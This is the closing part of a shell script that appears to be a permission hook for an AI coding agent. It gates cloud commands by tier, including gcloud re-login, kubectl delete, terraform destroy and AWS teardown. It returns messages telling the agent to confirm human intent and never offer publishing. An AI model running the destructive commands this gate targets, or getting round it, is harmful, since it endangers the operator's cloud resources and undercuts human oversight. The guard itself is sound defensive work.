  MSG="$REASON. Cut versions only with the GTM standard's own version-cut command (the gtm skill gives its exact form) — it runs the standard's never-worse gate and refuses on a new defect. Publishing is the operator's, in the GTM UI; never offer it."
elif [ "$TIER" = IDENTITY ]; then
  # THE PROMPT MUST NAME THE ACCOUNT BEING LEFT, or it is just another confirm.
  # "Proceed with gcloud auth login?" carries no information the operator did not
  # already have; "you are on <account>" is the one fact that makes the
  # answer different from yes. Read live rather than cached: a stale name here
  # would be worse than none, because it reads as authoritative.
  #
  # ASKING gcloud IS THE ONLY HONEST SOURCE. The account lives in gcloud's own
  # config dir, which this box's permissions.deny puts off-limits, so parsing the
  # file would mean both guessing a layout nothing here can verify and reaching
  # into a denied path. `config get-value` is local, offline and measured at
  # ~0.6s on 2026-09-15 — and it runs only after a rule has already fired, never
  # on the hot path of an ordinary Bash call.
  _ACT=""
  if command -v gcloud >/dev/null 2>&1; then
    _ACT="$(gcloud config get-value account 2>/dev/null | head -n1 | tr -d '\r')"
  fi
  # Anything that is not a single printable token is treated as no answer: an
  # error string, a warning line or "(unset)" must degrade to the generic form
  # rather than be printed back as if it were an identity.
  # the printable-ASCII test is tr under C: a [!-~] range in `case` follows the locale, and en_NZ rejected every account (harbor#1149)
  case "$_ACT" in ''|'(unset)') _ACT="" ;; esac
  [ -z "$(printf '%s' "$_ACT" | LC_ALL=C tr -d '!-~')" ] || _ACT=""
  if [ -n "$_ACT" ]; then
    _ACTNOTE="ACTIVE CLI ACCOUNT RIGHT NOW: $_ACT."
    # THE BARE PINNED FORM IS NOT ENOUGH WHERE IDENTITY DIRS EXIST, and shipping
    # it alone would have made this guard hand out the exact advice the box's
    # own ACCESS notes call the trap: a bare login refreshes the AMBIENT config,
    # the wrapper keeps reading the role dir, and the failure looks unchanged —
    # so the next hour goes into the wrong hypothesis. Stated conditionally
    # rather than with a path, because the dirs are a per-box convention and a
    # guard that hardcodes one lies on every other box.
    _PIN=" Pinned form: gcloud auth login $_ACT. If this box keeps per-identity config dirs, prefix CLOUDSDK_CONFIG=<dir> — a bare login refreshes the AMBIENT config and leaves the role dir expired, so nothing appears to change."
  else
    _ACTNOTE="The active CLI account could not be read here, so establish which identity you are on before answering."
    _PIN=" Pinned form: gcloud auth login <account>."
  fi
  # ALLOW-LIST, NOT DENY-LIST. `gcloud auth login <acct>` is the remedy for
  # exactly one rule; naming the rules it does NOT fit would mean a new identity
  # rule silently inherits advice nobody checked. Restoring a `config set account`
  # is a different command, and ADC is a different store entirely.
  case "$REASON" in 'gcloud auth login —'*) : ;; *) _PIN="" ;; esac
  MSG="$REASON. $_ACTNOTE Confirm a HUMAN intends this. $ID_HINT$_PIN$_NHNOTE"
else
  MSG="$REASON. This is the WARNING layer, not the boundary (harbor#193): confirm a HUMAN intends this on the named resource. Reads (ls/query/show/describe/get-*) are never gated.$_NHNOTE"
fi

# PreToolUse JSON contract: exit 0, decision on stdout. "ask" prompts the user;
# "deny" blocks and feeds the reason back to the model.
printf '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"%s","permissionDecisionReason":%s}}\n' \
  "$DECISION" "$(printf '%s [%s]' "$MSG" "$TIER" | jq -Rs .)"

# Census, on the deny path only and never fatal (mirrors guard-bash).
#
# The TIER belongs in the RULE token, not the shape. `cloud.$TIER` put it in the
# shape slot, which is enum-gated to argv|flat|path|channel|content|meta, so every
# tier was coerced to `meta` and a catastrophic deny was indistinguishable from a
# soft ask in the ledger. Mapped through a `case` over the two call-site literals
# rather than `tr`: it keeps design note 4 (every field is a call-site literal, no
# pass-through arm) true, and costs no fork.
# THE BLIND ARM IS ITS OWN TOKEN, not `cloud-catastrophic`. It carries the tier's
# posture but not its evidence — filing it under the same rule would make the one
# record that says "the tokenizer failed here" read as a rule that matched, and the
# census would report a catastrophic verb nobody can find in the command.
case "$TIER" in
  CATASTROPHIC) [ "$BLIND" = 1 ] && _crule=argv-blind-cloud || _crule=cloud-catastrophic ;;
  SOFT)         _crule=cloud-soft ;;
  IDENTITY)     _crule=cloud-identity ;;
  GTMSTD)       _crule=cloud-gtm-version ;;
  NGKUBE)       _crule=cloud-kubectl-delete ;;
  NGTF)         _crule=cloud-terraform-destroy ;;
  NGAWS)        _crule=cloud-aws-destroy ;;
  *)            _crule=cloud-unclassified ;;
esac
{ floor_log_decision cloud "$DECISION" "$_crule.$SHAPE" 2>/dev/null || :; } 2>/dev/null || :
exit 0
